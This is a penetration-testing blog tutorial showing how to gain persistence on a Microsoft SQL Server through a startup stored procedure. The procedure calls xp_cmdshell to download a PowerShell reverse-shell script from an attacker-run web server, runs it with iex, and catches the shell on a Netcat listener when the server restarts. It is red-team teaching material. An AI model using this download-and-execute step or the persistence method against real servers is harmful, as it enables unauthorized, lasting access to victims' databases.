<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Stored Procedures Persistence</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-stored-procedures-persistence/" rel="bookmark"><time class="entry-date published" datetime="2021-09-13T05:42:27+00:00">September 13, 2021</time><time class="updated" datetime="2025-05-10T18:15:18+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn one of many ways to gain persistence in SQL servers.  This article is an addition to our MSSQL for Pentesters series.</span></p>
<h3><span style="color: #800000;">Importance of Persistence in Red Team Operations</span></h3>
<p><span style="color: #000000;">Gaining persistence is one of the significant steps when performing Red Team operations. And when performing such operations on MSSQL, there are possibilities to gain persistence with start-up stored procedures, triggers, and registry keys. If you have privileges of the correct user and database, then it is easy to achieve persistence. Persistence can be stealthier if the instance is running through a domain user.</span></p>
<h3><span style="color: #800000;">Requirements for Persistence via Start-Up Stored Procedures</span></h3>
<p><span style="color: #000000;">When getting persistence via start-up stored procedures, the attacker must have sysadmin privileges. And another important thing is that this stored procedure should be in the master database. If sa does not own the stored procedures, they will not have input and output parameters, which means they will not be restarted with the server, which will beat the whole point of persistence.</span></p>
<h4><span style="color: #000000;">Steps to Achieve Persistence with Start-Up Stored Procedures</span></h4>
<p><span style="color: #000000;">Let’s dive into how to gain persistence with start-up stored procedures.</span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="1270" data-end="1303">Assume xp_cmdshell is enabled</strong>: First, invoke the <strong data-start="1323" data-end="1342">master database</strong> with the following query:</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">USE master
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MkaAUMQHFmg/YT7i89QGjNI/AAAAAAAAymI/mbcq8vsSMZg3MKRieCpRGVrIKV6fq5AAgCLcBGAsYHQ/s16000/1.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="1411" data-end="1445">Download the PowerShell script</strong>: Use wget to download the PowerShell one-liner to your attacking machine.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uYad4GxB_j8/YT7jC0UdZLI/AAAAAAAAymM/GYS3IstpQuU2RDYEMHYwEs1uqgd1LLICQCLcBGAsYHQ/s16000/2.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="1524" data-end="1558">Update the IP Address and Port</strong>: In the script, replace the given IP address with your localhost and update the port using the <strong>cat</strong> command. Then, enable the python server to share the PowerShell script to the target machine.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pqrGbUXY0R4/YT7jIXn4vBI/AAAAAAAAymQ/8qcy2i2GBakdd6otR15qkclbziA7cmhnwCLcBGAsYHQ/s16000/3.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="1758" data-end="1787">Create a Stored Procedure</strong>: Create a stored procedure that calls the PowerShell script from the online python server using the following query:</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">CREATE PROCEDURE test_sp
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://192.168.1.2/Invoke-PowerShellTcpOneLine.ps1'')"'
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2m_wqeIyRnk/YT7jNOy_PII/AAAAAAAAymY/TiROikEpsBUucOXZ8yXw_TlnGcvMRmBSwCLcBGAsYHQ/s16000/4.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="2122" data-end="2162">Add the Stored Procedure to Start-Up</strong>: We want the stored procedure to execute as soon as the server starts. Use the following query:</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">EXEC sp_procoption @ProcName = 'test_sp'
, @OptionName = 'startup'
, @OptionValue = 'on';</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3_ippes_6ik/YT7jRzHD0zI/AAAAAAAAymc/6m_iGjgwAK0h01j5D8XJ4PWkV0zoGKvvACLcBGAsYHQ/s16000/5.png"/></span></p>
<h4><span style="color: #000000;">Confirm the Start-Up Procedure</span></h4>
<p><span style="color: #000000;">Now we have our stored procedure in the start-up, which you can confirm using the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l0onzybHIqQ/YT7jWGyVUxI/AAAAAAAAymk/QmKeuPJU5N4eBv7G1xpRpvFlUB2xMg5LQCLcBGAsYHQ/s16000/6.png"/></span></p>
<h4><span style="color: #000000;">Starting the Server and Gaining a Session</span></h4>
<ul>
<li><span style="color: #000000;"><strong data-start="2634" data-end="2663">Start the Netcat listener</strong>: Turn on your Netcat listener.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g6WvsrgNwqc/YT7jafEB7nI/AAAAAAAAyms/lHExRFieoyojNy_f-Qpu0HWHtBtz0V3QQCLcBGAsYHQ/s16000/7.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="2698" data-end="2720">Restart the Server</strong>: To restart the server, right-click on it and select the <strong data-start="2778" data-end="2786">stop</strong> option. Then, right-click again and choose <strong data-start="2830" data-end="2839">start</strong>.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wb07LIMc57k/YT7jfHQ216I/AAAAAAAAymw/00xTdauHsCQjegK9OJM37IBdY3aajcuwQCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ff0Wlu0ExVg/YT7jpSTluII/AAAAAAAAynA/0EC-VVsR1AYxeRc7EogCnqWvnFA_qltYgCLcBGAsYHQ/s16000/9.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong data-start="2844" data-end="2866">Obtain the Session</strong>: Once the server is restarted, you will have a session on Netcat.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KjVKZMm4n6M/YT7jt6iDdAI/AAAAAAAAynI/1eIMZqY6d9AI_b8nosfxpIK3icvrcxK-gCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">So, this is how one gets persistence locally using start-up stored procedures.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong></span>and <span style="color: #0000ff;"><strong>Twitter</strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
